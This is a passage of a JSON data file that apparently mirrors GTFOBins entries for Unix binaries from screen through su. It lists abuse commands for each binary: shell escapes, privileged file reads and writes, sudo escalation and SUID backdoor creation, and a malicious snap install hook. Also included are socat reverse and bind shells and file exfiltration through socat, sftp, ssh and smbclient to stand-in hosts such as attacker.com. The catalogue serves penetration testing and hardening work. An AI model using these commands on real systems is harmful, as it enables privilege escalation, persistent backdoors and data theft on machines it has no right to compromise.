        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nscreen\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nThis works on screen version 4.06.02. Data is appended to the file and \\n is converted to \\r\\n.\nLFILE=file_to_write\nscreen -L -Logfile $LFILE echo DATA\n\n\nThis works on screen version 4.05.00. Data is appended to the file and \\n is converted to \\r\\n.\nLFILE=file_to_write\nscreen -L $LFILE echo DATA\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo screen"
      }
    ]
  },
  {
    "id": 241,
    "bin": "script",
    "url": "/gtfobins/script/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nscript -q /dev/null\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nThe wrote content is corrupted by debug prints.\nscript -q -c 'echo DATA' file_to_write\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo script -q /dev/null"
      }
    ]
  },
  {
    "id": 242,
    "bin": "scrot",
    "url": "/gtfobins/scrot/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nscrot -e /bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo scrot -e /bin/sh\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which scrot) .\n\n./scrot -e /bin/sh"
      }
    ]
  },
  {
    "id": 243,
    "bin": "sed",
    "url": "/gtfobins/sed/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nGNU version only. Also, this requires bash.\nsed -n '1e exec sh 1>&0' /etc/hosts\n\n\nGNU version only. The resulting shell is not a proper TTY shell.\nsed e\n\n"
      },
      {
        "func": "Command",
        "man": "It can be used to break out from restricted environments by running non-interactive system commands.\n\n\nGNU version only.\nsed -n '1e id' /etc/hosts\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_write\nsed -n \"1s/.*/DATA/w $LFILE\" /etc/hosts\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nsed '' \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which sed) .\n\nLFILE=file_to_read\n./sed -e '' \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nGNU version only. Also, this requires bash.\nsudo sed -n '1e exec sh 1>&0' /etc/hosts"
      }
    ]
  },
  {
    "id": 244,
    "bin": "service",
    "url": "/gtfobins/service/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\n/usr/sbin/service ../../bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo service ../../bin/sh"
      }
    ]
  },
  {
    "id": 245,
    "bin": "setarch",
    "url": "/gtfobins/setarch/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nsetarch $(arch) /bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which setarch) .\n\n./setarch $(arch) /bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo setarch $(arch) /bin/sh"
      }
    ]
  },
  {
    "id": 246,
    "bin": "setfacl",
    "url": "/gtfobins/setfacl/",
    "funcs": [
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which setfacl) .\n\nLFILE=file_to_change\nUSER=somebody\n./setfacl -m u:$USER:rwx $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_change\nUSER=somebody\nsudo setfacl -m -u:$USER:rwx $LFILE"
      }
    ]
  },
  {
    "id": 247,
    "bin": "sftp",
    "url": "/gtfobins/sftp/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nHOST=user@attacker.com\nsftp $HOST\n!/bin/sh\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend local file to a SSH server.\nRHOST=user@attacker.com\nsftp $RHOST\nput file_to_send file_to_save\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file from a SSH server.\nRHOST=user@attacker.com\nsftp $RHOST\nget file_to_get file_to_save\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nHOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh"
      }
    ]
  },
  {
    "id": 248,
    "bin": "sg",
    "url": "/gtfobins/sg/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nCommands can be run if the current user\u2019s group is specified, therefore no additional permissions are needed.\nsg $(id -ng)\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo sg root"
      }
    ]
  },
  {
    "id": 249,
    "bin": "shuf",
    "url": "/gtfobins/shuf/",
    "funcs": [
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nThe written file content is corrupted by adding a newline.\nLFILE=file_to_write\nshuf -e DATA -o \"$LFILE\"\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe read file content is corrupted by randomizing the order of NUL terminated strings.\nLFILE=file_to_read\nshuf -z \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThe written file content is corrupted by adding a newline.\nsudo install -m =xs $(which shuf) .\n\nLFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThe written file content is corrupted by adding a newline.\nLFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\""
      }
    ]
  },
  {
    "id": 250,
    "bin": "slsh",
    "url": "/gtfobins/slsh/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nslsh -e 'system(\"/bin/sh\")'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo slsh -e 'system(\"/bin/sh\")'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which slsh) .\n\n./slsh -e 'system(\"/bin/sh\")'"
      }
    ]
  },
  {
    "id": 251,
    "bin": "smbclient",
    "url": "/gtfobins/smbclient/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nsmbclient '\\\\attacker\\share'\n!/bin/sh\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nInstall Impacket and run sudo smbserver.py share /tmp on the attacker box to collect the file.\nsmbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nInstall Impacket and run sudo smbserver.py share /tmp on the attacker box to send the file.\nsmbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo smbclient '\\\\attacker\\share'\n!/bin/sh"
      }
    ]
  },
  {
    "id": 252,
    "bin": "snap",
    "url": "/gtfobins/snap/",
    "funcs": [
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nIt runs commands using a specially crafted Snap package. Generate it with fpm and upload it to the target.\nCOMMAND=id\ncd $(mktemp -d)\nmkdir -p meta/hooks\nprintf '#!/bin/sh\\n%s; false' \"$COMMAND\" >meta/hooks/install\nchmod +x meta/hooks/install\nfpm -n xxxx -s dir -t snap -a all meta\n\nsudo snap install xxxx_1.0_all.snap --dangerous --devmode"
      }
    ]
  },
  {
    "id": 253,
    "bin": "socat",
    "url": "/gtfobins/socat/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nThe resulting shell is not a proper TTY shell and lacks the prompt.\nsocat stdin exec:/bin/sh\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nRun socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.\nRHOST=attacker.com\nRPORT=12345\nsocat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane\n\n"
      },
      {
        "func": "Bind shell",
        "man": "It can bind a shell to a local port to allow remote network access.\n\n\nRun socat FILE:`tty`,raw,echo=0 TCP:target.com:12345 on the attacker box to connect to the shell.\nLPORT=12345\nsocat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nRun socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat on the attacker box to collect the file.\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nsocat -u file:$LFILE tcp-connect:$RHOST:$RPORT\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nRun socat -u file:file_to_send tcp-listen:12345,reuseaddr on the attacker box to send the file.\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nsocat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_write\nsocat -u 'exec:echo DATA' \"open:$LFILE,creat\"\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nsocat -u \"file:$LFILE\" -\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThe resulting shell is not a proper TTY shell and lacks the prompt.\nsudo socat stdin exec:/bin/sh\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nRun socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.\nsudo install -m =xs $(which socat) .\n\nRHOST=attacker.com\nRPORT=12345\n./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"
      }
    ]
  },
  {
    "id": 254,
    "bin": "soelim",
    "url": "/gtfobins/soelim/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nsoelim \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which soelim) .\n\nLFILE=file_to_read\n./soelim \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo soelim \"$LFILE\""
      }
    ]
  },
  {
    "id": 255,
    "bin": "sort",
    "url": "/gtfobins/sort/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nsort -m \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which sort) .\n\nLFILE=file_to_read\n./sort -m \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo sort -m \"$LFILE\""
      }
    ]
  },
  {
    "id": 256,
    "bin": "split",
    "url": "/gtfobins/split/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nThe shell prompt is not printed.\nsplit --filter=/bin/sh /dev/stdin\n\n"
      },
      {
        "func": "Command",
        "man": "It can be used to break out from restricted environments by running non-interactive system commands.\n\n\nCommand execution using an existing or newly created file.\nCOMMAND=id\nTF=$(mktemp)\nsplit --filter=$COMMAND $TF\n\n\nCommand execution using stdin (and close it directly).\nCOMMAND=id\necho | split --filter=$COMMAND /dev/stdin\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nData will be written in the current directory in a file named xaa by default. The input file will be split in multiple smaller files unless the -b option is used, pick a value in MB big enough.\nTF=$(mktemp)\necho DATA >$TF\nsplit -b999m $TF\n\n\nGNU version only. Data will be written in the current directory in a file named xaa.xxx by default. The input file will be split in multiple smaller files unless the -b option is used, pick a value in MB big enough.\nEXT=.xxx\nTF=$(mktemp)\necho DATA >$TF\nsplit -b999m --additional-suffix $EXTENSION $TF\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nTF=$(mktemp)\nsplit $LFILE $TF\ncat $TF*\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThe shell prompt is not printed.\nsudo split --filter=/bin/sh /dev/stdin"
      }
    ]
  },
  {
    "id": 257,
    "bin": "sqlite3",
    "url": "/gtfobins/sqlite3/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nsqlite3 /dev/null '.shell /bin/sh'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_write\nsqlite3 /dev/null -cmd \".output $LFILE\" 'select \"DATA\";'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which sqlite3) .\n\nLFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo sqlite3 /dev/null '.shell /bin/sh'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which sqlite3) .\n\n./sqlite3 /dev/null '.shell /bin/sh'"
      }
    ]
  },
  {
    "id": 258,
    "bin": "ss",
    "url": "/gtfobins/ss/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nss -a -F $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which ss) .\n\nLFILE=file_to_read\n./ss -a -F $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo ss -a -F $LFILE"
      }
    ]
  },
  {
    "id": 259,
    "bin": "ssh-keygen",
    "url": "/gtfobins/ssh-keygen/",
    "funcs": [
      {
        "func": "Library load",
        "man": "It loads shared libraries that may be used to run code in the binary execution context.\n\n\nssh-keygen -D ./lib.so\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which ssh-keygen) .\n\n./ssh-keygen -D ./lib.so\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo ssh-keygen -D ./lib.so"
      }
    ]
  },
  {
    "id": 260,
    "bin": "ssh-keyscan",
    "url": "/gtfobins/ssh-keyscan/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nssh-keyscan -f $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which ssh-keyscan) .\n\nLFILE=file_to_read\n./ssh-keyscan -f $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo ssh-keyscan -f $LFILE"
      }
    ]
  },
  {
    "id": 261,
    "bin": "ssh",
    "url": "/gtfobins/ssh/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nReconnecting may help bypassing restricted shells.\nssh localhost $SHELL --noprofile --norc\n\n\nSpawn interactive shell through ProxyCommand option.\nssh -o ProxyCommand=';sh 0<&2 1>&2' x\n\n\nSpawn interactive shell on client, requires a successful connection towards host.\nssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend local file to a SSH server.\nHOST=user@attacker.com\nRPATH=file_to_save\nLPATH=file_to_send\nssh $HOST \"cat > $RPATH\" < $LPATH\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file from a SSH server.\nHOST=user@attacker.com\nRPATH=file_to_get\nLPATH=file_to_save\nssh $HOST \"cat $RPATH\" > $LPATH\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe read file content is corrupted by error prints.\nLFILE=file_to_read\nssh -F $LFILE localhost\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nSpawn interactive root shell through ProxyCommand option.\nsudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
      }
    ]
  },
  {
    "id": 262,
    "bin": "sshpass",
    "url": "/gtfobins/sshpass/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nsshpass /bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which sshpass) .\n\n./sshpass /bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo sshpass /bin/sh"
      }
    ]
  },
  {
    "id": 263,
    "bin": "start-stop-daemon",
    "url": "/gtfobins/start-stop-daemon/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nstart-stop-daemon -n $RANDOM -S -x /bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which start-stop-daemon) .\n\n./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo start-stop-daemon -n $RANDOM -S -x /bin/sh"
      }
    ]
  },
  {
    "id": 264,
    "bin": "stdbuf",
    "url": "/gtfobins/stdbuf/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nstdbuf -i0 /bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which stdbuf) .\n\n./stdbuf -i0 /bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo stdbuf -i0 /bin/sh"
      }
    ]
  },
  {
    "id": 265,
    "bin": "strace",
    "url": "/gtfobins/strace/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nstrace -o /dev/null /bin/sh\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nThe data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of strace - DATA.\nLFILE=file_to_write\nstrace -s 999 -o $LFILE strace - DATA\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which strace) .\n\n./strace -o /dev/null /bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo strace -o /dev/null /bin/sh"
      }
    ]
  },
  {
    "id": 266,
    "bin": "strings",
    "url": "/gtfobins/strings/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nstrings \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which strings) .\n\nLFILE=file_to_read\n./strings \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo strings \"$LFILE\""
      }
    ]
  },
  {
    "id": 267,
    "bin": "su",
    "url": "/gtfobins/su/",
    "funcs": [
      {
        "func": "Sudo",
